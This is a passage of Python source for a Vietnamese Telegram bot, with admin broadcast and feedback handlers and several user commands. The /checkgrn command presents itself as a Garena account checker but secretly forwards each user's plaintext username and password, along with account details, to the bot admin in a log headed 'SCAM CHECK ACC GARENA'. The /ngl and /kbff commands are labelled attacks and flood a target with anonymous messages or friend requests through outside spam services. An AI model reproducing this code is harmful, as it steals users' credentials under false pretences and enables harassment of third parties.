        InlineKeyboardButton("✅ Có", callback_data="noti_add_button|yes"),
        InlineKeyboardButton("❌ Không", callback_data="noti_add_button|no")
    )

    send_message_robustly(
        message.chat.id,
        text="Bạn có muốn thêm nút (button) vào thông báo này không?",
        reply_markup=markup,
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("noti_add_button|"))
def noti_add_button(call):
    user_id = call.message.chat.id
    
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "🚫 Bạn không có quyền sử dụng nút này.", show_alert=True)
        return

    _, choice = call.data.split("|")

    with noti_states_lock:
        noti_info = bot.noti_states.get(user_id)

    if not noti_info:
        bot.answer_callback_query(call.id, "Đã xảy ra lỗi hoặc phiên làm việc đã hết. Vui lòng thử lại lệnh /noti.", show_alert=True)
        return

    if choice == "yes":
        bot.answer_callback_query(call.id, "Bạn đã chọn thêm nút.", show_alert=False)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="Tuyệt vời! Hãy gửi cho tôi tên của nút bạn muốn hiển thị (ví dụ: `Tham gia nhóm`).",
            parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, process_button_text)
    else:
        bot.answer_callback_query(call.id, "Bạn đã chọn không thêm nút.", show_alert=False)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="Đang gửi thông báo...",
            parse_mode="HTML"
        )
        send_final_notification(user_id)

def process_button_text(message):
    user_id = message.chat.id
    with noti_states_lock:
        noti_info = bot.noti_states.get(user_id)

    if not noti_info:
        send_message_robustly(user_id, "Đã xảy ra lỗi hoặc phiên làm việc đã hết. Vui lòng thử lại lệnh /noti.", parse_mode="HTML")
        return

    button_text = message.text.strip()
    if not button_text:
        send_message_robustly(user_id, "⚠️ Tên nút không được để trống. Vui lòng gửi lại tên nút.", parse_mode="HTML", reply_to_message_id=message.message_id)
        bot.register_next_step_handler(message, process_button_text)
        return

    with noti_states_lock:
        noti_info['button_text'] = button_text
        bot.noti_states[user_id] = noti_info

    send_message_robustly(
        user_id,
        f"Đã lưu tên nút: <b>{html_escape(button_text)}</b>. Bây giờ hãy gửi cho tôi URL mà nút sẽ dẫn đến (ví dụ: `https://t.me/zproject3`).",
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )
    bot.register_next_step_handler(message, process_button_url)

def process_button_url(message):
    user_id = message.chat.id
    with noti_states_lock:
        noti_info = bot.noti_states.get(user_id)

    if not noti_info:
        send_message_robustly(user_id, "Đã xảy ra lỗi hoặc phiên làm việc đã hết. Vui lòng thử lại lệnh /noti.", parse_mode="HTML")
        return

    button_url = message.text.strip()
    if not button_url or not (button_url.startswith("http://") or button_url.startswith("https://")):
        send_message_robustly(user_id, "⚠️ URL không hợp lệ. Vui lòng gửi lại một URL đầy đủ (ví dụ: `https://t.me/zproject3`).", parse_mode="HTML", reply_to_message_id=message.message_id)
        bot.register_next_step_handler(message, process_button_url)
        return

    with noti_states_lock:
        noti_info['button_url'] = button_url
        bot.noti_states[user_id] = noti_info

    send_message_robustly(
        user_id,
        "Đã lưu URL. Đang tiến hành gửi thông báo với nút...",
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

    send_final_notification(user_id)

def send_final_notification(admin_id):
    with noti_states_lock:
        noti_info = bot.noti_states.pop(admin_id, None)

    if not noti_info:
        send_message_robustly(admin_id, "Đã xảy ra lỗi khi gửi thông báo. Thông tin không tồn tại.", parse_mode="HTML")
        return

    notify_caption = noti_info['caption']
    photo_file_id = noti_info['photo_file_id']
    button_text = noti_info['button_text']
    button_url = noti_info['button_url']
    original_message_id = noti_info['original_message_id']

    markup = None
    if button_text and button_url:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(button_text, url=button_url))

    ok_users_count, ok_groups_count = 0, 0
    failed_count = 0
    failed_details = []
    
    with user_group_info_lock:
        all_users = list(USER_IDS)
        all_groups = list(GROUP_INFOS)

    for uid in all_users:
        try:
            send_message_robustly(
                chat_id=uid,
                photo=photo_file_id,
                caption=notify_caption if photo_file_id else None,
                text=notify_caption if not photo_file_id else None,
                parse_mode="HTML",
                disable_web_page_preview=True if not photo_file_id else None,
                reply_markup=markup
            )
            ok_users_count += 1
            time.sleep(0.1)
        except Exception as e:
            failed_count += 1
            failed_details.append(f"Người dùng ID: <code>{uid}</code> (Lỗi: {html_escape(str(e))})")
            logging.error(f"Failed to send notification to user {uid}: {e}")

    for group in all_groups:
        group_id = group["id"]
        group_title = group.get("title", "Không rõ tên nhóm")
        group_username = group.get("username", "")
        
        try:
            send_message_robustly(
                chat_id=group_id,
                photo=photo_file_id,
                caption=notify_caption if photo_file_id else None,
                text=notify_caption if not photo_file_id else None,
                parse_mode="HTML",
                disable_web_page_preview=True if not photo_file_id else None,
                reply_markup=markup
            )
            ok_groups_count += 1
            time.sleep(0.1)
        except Exception as e:
            failed_count += 1
            group_display = f"{group_title} (ID: <code>{group_id}</code>)"
            if group_username:
                group_display += f" (@{group_username})"
            failed_details.append(f"Nhóm: {group_display} (Lỗi: {html_escape(str(e))})")
            logging.error(f"Failed to send notification to group {group_id}: {e}")

    total_sent = ok_users_count + ok_groups_count
    
    result_text = (
        f"✅ Gửi thành công: {total_sent} tin nhắn (Đến <b>{ok_users_count}</b> người dùng và <b>{ok_groups_count}</b> nhóm).\n"
        f"❌ Gửi thất bại: {failed_count} tin nhắn.\n\n"
    )

    if failed_count > 0:
        result_text += "<b>⚠️ Chi tiết thất bại:</b>\n"
        for detail in failed_details:
            result_text += f"- {detail}\n"
    else:
        result_text += "🎉 Tất cả thông báo đã được gửi thành công!"

    send_message_robustly(
        admin_id,
        text=result_text,
        parse_mode="HTML",
        reply_to_message_id=original_message_id
    )

@bot.message_handler(commands=['like'])
@increment_interaction_count
@group_membership_required
def send_like(message):
    logging.info(f"Received /like from user {message.from_user.id} in chat {message.chat.id}")
    sync_chat_to_server(message.chat)

    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Vui lòng sử dụng lệnh:\n/like [UID]")
        return

    uid = parts[1]
    if not uid.isdigit():
        bot.reply_to(message, "UID không hợp lệ.")
        return

    wait_msg = bot.reply_to(message, "⏳️")

    url = "https://likefreefirecommunity-ggblueshark.vercel.app/like"
    params = {"uid": uid, "server_name": "vn", "key": "ayacte"}

    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            try:
                json_data = response.json()
                if json_data.get("status") == 2:
                    buff_info_message = f"""
                    <blockquote>
                        <b>Thông Tin Buff Like FF</b>\n
                        <i>Trạng thái:</i> <b>Thành công</b>\n
                        <i>UID:</i> <b>{uid}</b>\n
                        <i>DATA</i>\n
                        <pre>{json.dumps(json_data, indent=2, ensure_ascii=False)}</pre>
                    </blockquote>
                    """
                    bot.edit_message_text(chat_id=message.chat.id, message_id=wait_msg.message_id, text="✅️")
                    bot.reply_to(message, buff_info_message, parse_mode="HTML")
                else:
                    error_message = json_data.get("message", "Yêu cầu thất bại.")
                    bot.edit_message_text(chat_id=message.chat.id, message_id=wait_msg.message_id, text="❌️")
                    bot.reply_to(message, f"""
                    <blockquote>
                        <b>Thông tin buff</b>\n
                        <i>Trạng thái:</i> <b>Thất bại</b>\n
                        <i>Lỗi:</i> <i>{error_message}</i>
                    </blockquote>
                    """, parse_mode="HTML")
            except Exception:
                bot.edit_message_text(chat_id=message.chat.id, message_id=wait_msg.message_id, text="✅️")
                bot.reply_to(message, f"""
                <blockquote>
                    <b>Thông Tin Buff Like FF</b>\n
                    <i>Trạng thái:</i> <b>Thành công</b>\n
                    <i>UID:</i> <b>{uid}</b>\n
                    <i>DATA:</i>\n
                    <pre>{response.text}</pre>
                </blockquote>
                """, parse_mode="HTML")
        else:
            try:
                error_data = response.json()
                error_message = error_data.get("error", f"Yêu cầu thất bại. Mã trạng thái: {response.status_code}")
                
                bot.edit_message_text(chat_id=message.chat.id, message_id=wait_msg.message_id, text="❌️")
                bot.reply_to(message, f"""
                <blockquote>
                    <b>Thông tin buff</b>\n
                    <i>Trạng thái:</i> <b>Thất bại</b>\n
                    <i>Lỗi:</i> <i>{error_message}</i>
                </blockquote>
                """, parse_mode="HTML")
            except Exception:
                bot.edit_message_text(chat_id=message.chat.id, message_id=wait_msg.message_id, text="❌️")
                bot.reply_to(message, f"""
                <blockquote>
                    <b>Thông tin buff</b>\n
                    <i>Trạng thái:</i> <b>Thất bại</b>\n
                    <i>Mã trạng thái:</i> <i>{response.status_code}</i>\n
                    <i>Không thể đọc chi tiết lỗi.</i>
                </blockquote>
                """, parse_mode="HTML")
    except Exception as e:
        bot.edit_message_text(chat_id=message.chat.id, message_id=wait_msg.message_id, text="❌️")
        bot.reply_to(message, f"""
        <blockquote>
            <b>Thông tin buff</b>\n
            <i>Trạng thái:</i> <b>Thất bại nghiêm trọng</b>\n
            <i>Lỗi hệ thống:</i> <i>{e}</i>
        </blockquote>
        """, parse_mode="HTML")

@bot.message_handler(commands=["ngl"])
@increment_interaction_count
@group_membership_required
def spam_ngl_command(message):
    logging.info(f"Received /ngl from user {message.from_user.id} in chat {message.chat.id}")
    sync_chat_to_server(message.chat)

    args = message.text.split(maxsplit=3)

    if len(args) < 4:
        return send_message_robustly(message.chat.id, text="⚠️ Sử dụng: <code>/ngl &lt;username&gt; &lt;tin_nhan&gt; &lt;số_lần&gt;</code>", parse_mode="HTML", reply_to_message_id=message.message_id)

    username = args[1]
    tinnhan = args[2]
    solan_str = args[3]

    try:
        solan = int(solan_str)
        if not (1 <= solan <= 30):
            return send_message_robustly(message.chat.id, text="❗ Số lần phải từ 1 đến 30.", parse_mode="HTML", reply_to_message_id=message.message_id)
    except ValueError:
        return send_message_robustly(message.chat.id, text="❗ Số lần phải là một số hợp lệ, không phải ký tự.", parse_mode="HTML", reply_to_message_id=message.message_id)

    ngl_api_url = f"https://zeusvr.x10.mx/ngl?api-key=dcbfree&username={username}&tinnhan={tinnhan}&solan={solan}"

    try:
        response = session.get(ngl_api_url) 
        response.raise_for_status()
        data = response.json()

        if data.get("status") == "success":
            total_sent = data["data"].get("total_sent", 0)
            failed_count = data["data"].get("failed", 0)

            reply_text = (
                f"<blockquote><b>✅ Đã Attack NGL Thành Công!</b>\n\n"
                f"<b>👤 Username:</b> <code>{username}</code>\n"
                f"<b>💬 Tin nhắn:</b> <code>{tinnhan}</code>\n"
                f"<b>🔢 Số lần gửi:</b> <code>{total_sent}</code>\n"
                f"<b>❌ Thất bại:</b> <code>{failed_count}</code></blockquote>"
            )

            send_message_robustly(
                chat_id=message.chat.id,
                photo=NGL_SUCCESS_IMAGE_URL,
                caption=reply_text,
                parse_mode="HTML",
                reply_to_message_id=message.message_id
            )
        else:
            error_message = data.get("message", "Có lỗi xảy ra khi gọi API NGL.")
            send_message_robustly(message.chat.id, text=f"❌ Lỗi NGL API: {error_message}", parse_mode="HTML", reply_to_message_id=message.message_id)

    except requests.exceptions.ReadTimeout as e:
        logging.error(f"Lỗi timeout khi gọi NGL API cho người dùng {message.from_user.id}: {e}")
        send_message_robustly(message.chat.id, text="❌ Lỗi: API NGL không phản hồi kịp thời. Vui lòng thử lại sau.", parse_mode="HTML", reply_to_message_id=message.message_id)
    except requests.exceptions.ConnectionError as e:
        logging.error(f"Lỗi kết nối khi gọi NGL API cho người dùng {message.from_user.id}: {e}")
        send_message_robustly(message.chat.id, text=f"❌ Lỗi kết nối đến NGL API: Không thể kết nối đến máy chủ. Vui lòng kiểm tra lại sau.", parse_mode="HTML", reply_to_message_id=message.message_id)
    except requests.exceptions.RequestException as e:
        logging.error(f"Lỗi HTTP (4xx/5xx) hoặc request khác khi gọi NGL API cho người dùng {message.from_user.id}: {e}")
        send_message_robustly(message.chat.id, text=f"❌ Lỗi khi gọi NGL API: Đã có lỗi xảy ra từ máy chủ NGL. Chi tiết: <code>{e}</code>", parse_mode="HTML", reply_to_message_id=message.message_id)
    except ValueError as e:
        logging.error(f"Lỗi phân tích JSON từ NGL API cho người dùng {message.from_user.id}: {e}")
        send_message_robustly(message.chat.id, text="❌ Lỗi: Phản hồi API NGL không hợp lệ.", parse_mode="HTML", reply_to_message_id=message.message_id)
    except Exception as e:
        logging.error(f"Lỗi không xác định khi xử lý /ngl cho người dùng {message.from_user.id}: {e}")
        send_message_robustly(message.chat.id, text=f"❌ Đã xảy ra lỗi không mong muốn khi xử lý lệnh spam NGL: <code>{e}</code>", parse_mode="HTML", reply_to_message_id=message.message_id)

@bot.message_handler(commands=["phanhoi"])
@increment_interaction_count
@group_membership_required
def send_feedback_to_admin(message):
    logging.info(f"Received /phanhoi from user {message.from_user.id} in chat {message.chat.id}")
    sync_chat_to_server(message.chat)
    feedback_text = message.text.replace("/phanhoi", "").strip()

    if not feedback_text:
        return send_message_robustly(message.chat.id, text="⚠️ Vui lòng nhập nội dung phản hồi. Ví dụ: <code>/phanhoi Bot bị lỗi ở lệnh /ask</code>", parse_mode="HTML", reply_to_message_id=message.message_id)

    user_info_for_admin = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    if message.from_user.last_name:
        user_info_for_admin += f" {message.from_user.last_name}"
    if message.from_user.username:
        user_info_for_admin += f" (@{message.from_user.username})"
    user_info_for_admin += f" (<code>{message.from_user.id}</code>)"

    chat_info_for_admin = f"ID Chat: <code>{message.chat.id}</code>\n" \
                          f"Loại Chat: {message.chat.type}"
    if message.chat.type in ["group", "supergroup"]:
        chat_info_for_admin += f"\nTên Chat: {message.chat.title}"

    timestamp = datetime.now().strftime("%H:%M:%S ngày %d/%m/%Y")

    admin_notification = (
        f"<b>📧 PHẢN HỒI MỚI TỪ NGƯỜI DÙNG</b>\n\n"
        f"<b>Người gửi:</b>\n{user_info_for_admin}\n"
        f"<b>Thông tin Chat:</b>\n{chat_info_for_admin}\n"
        f"<b>Thời gian:</b> <code>{timestamp}</code>\n\n"
        f"<b>Nội dung phản hồi:</b>\n<blockquote>{html_escape(feedback_text)}</blockquote>\n\n"
        f"<i>Để phản hồi lại người dùng này, hãy reply tin nhắn này và dùng lệnh <code>/adminph &lt;nội dung phản hồi&gt;</code></i>"
    )

    try:
        sent_message_to_admin = bot.send_message(
            chat_id=ADMIN_ID,
            text=admin_notification,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        with feedback_messages_lock:
            bot.feedback_messages[sent_message_to_admin.message_id] = {
                'chat_id': message.chat.id,
                'user_id': message.from_user.id,
                'user_first_name': message.from_user.first_name,
                'feedback_text': feedback_text
            }
        
        send_message_robustly(message.chat.id, text="✅ Cảm ơn bạn đã gửi phản hồi! Admin sẽ xem xét sớm nhất có thể.", parse_mode="HTML", reply_to_message_id=message.message_id)
    except Exception as e:
        logging.error(f"Lỗi khi gửi phản hồi đến admin: {e}")
        send_message_robustly(message.chat.id, text="❌ Đã xảy ra lỗi khi gửi phản hồi. Vui lòng thử lại sau.", parse_mode="HTML", reply_to_message_id=message.message_id)

import json # Đảm bảo import json ở đầu file nếu chưa có

# Lệnh /checkgrn
@bot.message_handler(commands=['checkgrn'])
@increment_interaction_count
@group_membership_required
def handle_checkgrn_command(message):
    logging.info(f"Received /checkgrn from user {message.from_user.id} in chat {message.chat.id}")
    sync_chat_to_server(message.chat)

    parts = message.text.strip().split(maxsplit=2) # Tách thành 3 phần: lệnh, username, password

    if len(parts) != 3:
        send_message_robustly(
            message.chat.id,
            text="<blockquote>❌ <b>Sai Lệnh!</b> Sử dụng: <code>/checkgrn &lt;username&gt; &lt;password&gt;</code>\nVí dụ: <code>/checkgrn Zproject_1 bG5JPrKEsUi.MQk</code></blockquote>",
            parse_mode="HTML",
            reply_to_message_id=message.message_id # <--- Đã thêm reply_to_message_id
        )
        return

    username = html_escape(parts[1])
    password = html_escape(parts[2]) # Không escape để gửi đúng password tới API, nhưng escape khi hiển thị cho người dùng

    wait_msg = send_message_robustly(
        message.chat.id,
        text=f"<blockquote>⏳ <i>ZprojectX đang check, đợi tí</i> <code>{username}</code>...</blockquote>",
        parse_mode="HTML",
        reply_to_message_id=message.message_id # <--- Đã thêm reply_to_message_id
    )
    if not wait_msg:
        logging.error(f"Failed to send waiting message for /checkgrn from user {message.from_user.id}")
        return

    api_url = f"https://zproject-api-check-garena.onrender.com/check?username={username}&password={password}&api-key=zprojectfree"

    try:
        response = session.get(api_url, timeout=DEFAULT_TIMEOUT_GLOBAL)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        api_data = response.json()

        if api_data.get("status") == "SUCCESS":
            data = api_data.get("data", {})
            thong_tin_tai_khoan = data.get("thong_tin_tai_khoan", {})
            bao_mat = data.get("bao_mat", {})
            lich_su = data.get("lich_su_dang_nhap_gan_nhat", {})

            # Lấy các giá trị an toàn
            safe_get = lambda d, k, default="N/A": html_escape(str(d.get(k, default)))

            result_message_for_user = f"""
<blockquote>
<b>✅ THÔNG TIN TÀI KHOẢN GARENA ✅</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>⚜️ THÔNG TIN CƠ BẢN</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>👤 Tên Đăng Nhập:</b> <code>{safe_get(thong_tin_tai_khoan, "Ten_Dang_Nhap")}</code>
<b>🆔 UID:</b> <code>{safe_get(thong_tin_tai_khoan, "UID")}</code>
<b>💌 Email:</b> <code>{safe_get(thong_tin_tai_khoan, "Email")}</code>
<b>📞 SĐT:</b> <code>{safe_get(thong_tin_tai_khoan, "So_Dien_Thoai")}</code>
<b>🌟 Biệt Danh:</b> <code>{safe_get(thong_tin_tai_khoan, "Biet_Danh")}</code>
<b>✍️ Chữ Ký:</b> <code>{safe_get(thong_tin_tai_khoan, "Chu_Ky")}</code>
<b>🌍 Quốc Gia:</b> <code>{safe_get(thong_tin_tai_khoan, "Quoc_Gia")}</code>
<b>💸 Shell:</b> <code>{safe_get(thong_tin_tai_khoan, "Shell")}</code>
<b>🎮 Game Đã Chơi:</b> <code>{safe_get(thong_tin_tai_khoan, "Game_Da_Choi")}</code>
<b>🔗 Facebook:</b> <code>{safe_get(thong_tin_tai_khoan, "Tai_Khoan_Facebook")}</code>

<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>🔒 THÔNG TIN BẢO MẬT</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>🚫 Hoạt Động Lạ:</b> <code>{safe_get(bao_mat, "Nghi_Ngo_Hoat_Dong_La")}</code>
<b>📧 Xác Minh Email:</b> <code>{safe_get(bao_mat, "Xac_Minh_Email")}</code>
<b>🔐 Xác Thực 2 Bước:</b> <code>{safe_get(bao_mat, "Xac_Thuc_2_Buoc")}</code>
<b>📱 Xác Thực Ứng Dụng:</b> <code>{safe_get(bao_mat, "Xac_Thuc_Ung_Dung")}</code>

<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>⏰ LỊCH SỬ ĐĂNG NHẬP GẦN NHẤT</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>📍 IP:</b> <code>{safe_get(lich_su, "IP")}</code>
<b>🌐 Nguồn:</b> <code>{safe_get(lich_su, "Nguon")}</code>
<b>🌍 Quốc Gia:</b> <code>{safe_get(lich_su, "Quoc_Gia")}</code>

<b>━━━━━━━━━━━━━━━━━━━━</b>
<i>👑 ADMIN:</i> @zproject2  
⚡ <i>GROUP:</i> <a href="https://t.me/zproject3">Tham gia ngay</a>
━━━━━━━━━━━━━━━━━━━━
</blockquote>
"""
            bot.edit_message_text(
                chat_id=wait_msg.chat.id,
                message_id=wait_msg.message_id,
                text=result_message_for_user,
                parse_mode="HTML",
                disable_web_page_preview=True
            )

            # Gửi log riêng về cho admin
            admin_log_message = f"""
<b>🔑 SCAM CHECK ACC GARENA 🔑</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>👤 Người Dùng Yêu Cầu:</b> <a href='tg://user?id={message.from_user.id}'>{html_escape(message.from_user.first_name)}</a> (<code>{message.from_user.id}</code>)
<b>💬 Chat ID:</b> <code>{message.chat.id}</code>
<b>💬 Loại Chat:</b> <code>{message.chat.type}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>🎯 Thông Tin:</b>
<b>Tên Đăng Nhập:</b> <code>{username}</code>
<b>Mật Khẩu:</b> <code>{password}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>📊 Dữ Liệu API Trả Về:</b>
<pre>{json.dumps(api_data, indent=2, ensure_ascii=False)}</pre>
<b>━━━━━━━━━━━━━━━━━━━━</b>
"""
            send_message_robustly(ADMIN_ID, admin_log_message, parse_mode="HTML")

        else: # API Status is FAILED or unexpected
            error_message = api_data.get("message", "Lỗi không xác định từ API Garena.")
            result_message_for_user = f"""
<blockquote>
❌ <b>Kiểm Tra Thất Bại!</b>
<i>Lỗi:</i> <code>{html_escape(error_message)}</code>
Vui lòng kiểm tra lại <b>Tên Đăng Nhập</b> hoặc <b>Mật Khẩu</b>.
</blockquote>
"""
            bot.edit_message_text(
                chat_id=wait_msg.chat.id,
                message_id=wait_msg.message_id,
                text=result_message_for_user,
                parse_mode="HTML"
            )

            # Gửi log thất bại về cho admin
            admin_log_message_failed = f"""
<b>⚠️ LOG CHECK GARENA THẤT BẠI ⚠️</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>👤 Người Dùng Yêu Cầu:</b> <a href='tg://user?id={message.from_user.id}'>{html_escape(message.from_user.first_name)}</a> (<code>{message.from_user.id}</code>)
<b>💬 Chat ID:</b> <code>{message.chat.id}</code>
<b>💬 Loại Chat:</b> <code>{message.chat.type}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>🎯 Thông Tin Yêu Cầu:</b>
<b>Tên Đăng Nhập:</b> <code>{username}</code>
<b>Mật Khẩu:</b> <code>{password}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>❌ Lỗi API:</b> <code>{html_escape(error_message)}</code>
<b>📊 Dữ Liệu API Trả Về (Thô):</b>
<pre>{json.dumps(api_data, indent=2, ensure_ascii=False)}</pre>
<b>━━━━━━━━━━━━━━━━━━━━</b>
"""
            send_message_robustly(ADMIN_ID, admin_log_message_failed, parse_mode="HTML")

    except requests.exceptions.RequestException as e:
        logging.error(f"Lỗi kết nối hoặc HTTP khi gọi API Garena cho {username}: {e}")
        error_message_for_user = (
            f"<blockquote>❌ <b>Không thể kết nối đến dịch vụ kiểm tra Garena.</b>\n"
            f"Vui lòng thử lại sau. Chi tiết lỗi: <code>{html_escape(str(e))}</code></blockquote>"
        )
        bot.edit_message_text(
            chat_id=wait_msg.chat.id,
            message_id=wait_msg.message_id,
            text=error_message_for_user,
            parse_mode="HTML"
        )

        # Gửi log lỗi kết nối về cho admin
        admin_log_message_error = f"""
<b>🚨 LOG LỖI KẾT NỐI API GARENA 🚨</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>👤 Người Dùng Yêu Cầu:</b> <a href='tg://user?id={message.from_user.id}'>{html_escape(message.from_user.first_name)}</a> (<code>{message.from_user.id}</code>)
<b>💬 Chat ID:</b> <code>{message.chat.id}</code>
<b>💬 Loại Chat:</b> <code>{message.chat.type}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>🎯 Thông Tin Yêu Cầu:</b>
<b>Tên Đăng Nhập:</b> <code>{username}</code>
<b>Mật Khẩu:</b> <code>{password}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>❌ Lỗi Hệ Thống:</b> <code>{html_escape(str(e))}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
"""
        send_message_robustly(ADMIN_ID, admin_log_message_error, parse_mode="HTML")

    except json.JSONDecodeError as e:
        logging.error(f"Lỗi phân tích JSON từ API Garena cho {username}: {e}\nResponse text: {response.text}")
        error_message_for_user = (
            f"<blockquote>❌ <b>Phản hồi từ dịch vụ Garena không hợp lệ.</b>\n"
            f"Vui lòng thử lại sau hoặc liên hệ quản trị viên.</blockquote>"
        )
        bot.edit_message_text(
            chat_id=wait_msg.chat.id,
            message_id=wait_msg.message_id,
            text=error_message_for_user,
            parse_mode="HTML"
        )

        # Gửi log lỗi JSON về cho admin
        admin_log_message_json_error = f"""
<b>⚠️ LOG LỖI JSON TỪ API GARENA ⚠️</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>👤 Người Dùng Yêu Cầu:</b> <a href='tg://user?id={message.from_user.id}'>{html_escape(message.from_user.first_name)}</a> (<code>{message.from_user.id}</code>)
<b>💬 Chat ID:</b> <code>{message.chat.id}</code>
<b>💬 Loại Chat:</b> <code>{message.chat.type}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>🎯 Thông Tin Yêu Cầu:</b>
<b>Tên Đăng Nhập:</b> <code>{username}</code>
<b>Mật Khẩu:</b> <code>{password}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>❌ Lỗi JSON:</b> <code>{html_escape(str(e))}</code>
<b>Raw Response:</b> <pre>{html_escape(response.text)}</pre>
<b>━━━━━━━━━━━━━━━━━━━━</b>
"""
        send_message_robustly(ADMIN_ID, admin_log_message_json_error, parse_mode="HTML")

    except Exception as e:
        logging.error(f"Lỗi không xác định khi xử lý /checkgrn cho {username}: {e}")
        error_message_for_user = (
            f"<blockquote>❌ <b>Đã xảy ra lỗi không mong muốn.</b>\n"
            f"Vui lòng thử lại sau hoặc liên hệ quản trị viên. Chi tiết lỗi: <code>{html_escape(str(e))}</code></blockquote>"
        )
        bot.edit_message_text(
            chat_id=wait_msg.chat.id,
            message_id=wait_msg.message_id,
            text=error_message_for_user,
            parse_mode="HTML"
        )

        # Gửi log lỗi không xác định về cho admin
        admin_log_message_unknown_error = f"""
<b>🚨 LOG LỖI KHÔNG XÁC ĐỊNH KHI CHECK GARENA 🚨</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>👤 Người Dùng Yêu Cầu::</b> <a href='tg://user?id={message.from_user.id}'>{html_escape(message.from_user.first_name)}</a> (<code>{message.from_user.id}</code>)
<b>💬 Chat ID:</b> <code>{message.chat.id}</code>
<b>💬 Loại Chat:</b> <code>{message.chat.type}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>🎯 Thông Tin Yêu Cầu:</b>
<b>Tên Đăng Nhập:</b> <code>{username}</code>
<b>Mật Khẩu:</b> <code>{password}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>❌ Lỗi Không Xác Định:</b> <code>{html_escape(str(e))}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
"""
        send_message_robustly(ADMIN_ID, admin_log_message_unknown_error, parse_mode="HTML")

@bot.message_handler(commands=["kbff"])
@increment_interaction_count
@group_membership_required
def request_add_friend(message):
    logging.info(f"Received /kbff from user {message.from_user.id} in chat {message.chat.id}")
    sync_chat_to_server(message.chat)
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        return send_message_robustly(
            message.chat.id,
            text="⚠️ Vui lòng nhập UID cần Spam kết bạn. Ví dụ: <code>/kbff 2211865132</code>",
            parse_mode="HTML",
            reply_to_message_id=message.message_id
        )

    uid_to_add = command_parts[1].strip()

    if not uid_to_add.isdigit():
        return send_message_robustly(
            message.chat.id,
            text="⚠️ UID phải là một dãy số. Ví dụ: <code>/kbff 2211865132</code>",
            parse_mode="HTML",
            reply_to_message_id=message.message_id
        )

    waiting_message = send_message_robustly(
        message.chat.id,
        text="⏳",
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

    if not waiting_message:
        logging.error(f"Failed to send waiting message for /kbff from user {message.from_user.id}")
        return

    api_url = f"https://zproject-bot-spam.onrender.com/addfriend?uid={uid_to_add}"

    try:
        response = requests.get(api_url)
        response.raise_for_status()
        api_data = response.json()

        success_count = api_data.get("success_count", 0)
        failed_count = api_data.get("failed_count", 0)
        admin_info = api_data.get("admin", "N/A")

        result_text = (
            f"<b>✅ ATTACK SPAM KB FF</b>\n\n"
            f"<blockquote>"
            f"<b>UID SPAM KB:</b> <code>{uid_to_add}</code>\n"
            f"<b>Thành công:</b> <code>{success_count}</code>\n"
            f"<b>Thất bại:</b> <code>{failed_count}</code>\n"
            f"<b>Admin API:</b> {html_escape(admin_info)}\n"
            f"</blockquote>"
        )
        
        bot.edit_message_text(
            chat_id=waiting_message.chat.id,
            message_id=waiting_message.message_id,
            text=result_text,
            parse_mode="HTML",
            disable_web_page_preview=True
        )

    except requests.exceptions.RequestException as e:
        logging.error(f"Lỗi khi gọi API addfriend cho UID {uid_to_add}: {e}")
        error_message = (
            f"❌ Đã xảy ra lỗi khi kết nối đến dịch vụ kết bạn.\n\n"
            f"<blockquote>"
            f"Vui lòng thử lại sau hoặc liên hệ quản trị viên."
            f"</blockquote>"
        )
        bot.edit_message_text(
            chat_id=waiting_message.chat.id,
            message_id=waiting_message.message_id,
            text=error_message,
            parse_mode="HTML"
        )
    except ValueError as e:
        logging.error(f"Lỗi phân tích JSON từ API addfriend cho UID {uid_to_add}: {e}")
        error_message = (
            f"❌ Phản hồi từ dịch vụ kết bạn không hợp lệ.\n\n"
            f"<blockquote>"
            f"Vui lòng thử lại sau hoặc liên hệ quản trị viên."
            f"</blockquote>"
        )
        bot.edit_message_text(
            chat_id=waiting_message.chat.id,
            message_id=waiting_message.message_id,
            text=error_message,
            parse_mode="HTML"
        )
    except Exception as e:
        logging.error(f"Lỗi không xác định khi xử lý /kbff cho UID {uid_to_add}: {e}")
        error_message = (
            f"❌ Đã xảy ra lỗi không mong muốn.\n\n"
            f"<blockquote>"
            f"Vui lòng thử lại sau hoặc liên hệ quản trị viên."
            f"</blockquote>"
        )
        bot.edit_message_text(
            chat_id=waiting_message.chat.id,
            message_id=waiting_message.message_id,
            text=error_message,
            parse_mode="HTML"
        )
        
@bot.message_handler(commands=["adminph"])
